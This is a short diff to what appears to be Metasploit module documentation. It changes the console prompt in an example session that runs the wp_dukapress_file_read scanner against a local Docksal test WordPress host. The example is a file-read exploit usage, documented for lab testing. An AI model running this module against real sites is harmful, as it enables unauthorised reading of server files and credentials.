@@ -120,12 +120,12 @@ Traversal Depth (to reach the root folder) (default: `7`)
 Follow the Instructions above to setup the Docksal Containers.
 
 ````
-msf5 > use auxiliary/scanner/http/wp_dukapress_file_read
-msf5 > set RHOST msf-wp.docksal
+msf > use auxiliary/scanner/http/wp_dukapress_file_read
+msf > set RHOST msf-wp.docksal
 RHOST => msf-wp.docksal
-msf5 > set VHOST msf-wp.docksal
+msf > set VHOST msf-wp.docksal
 VHOST => msf-wp.docksal
-msf5 > run
+msf > run
 
 [*] Downloading file...
 
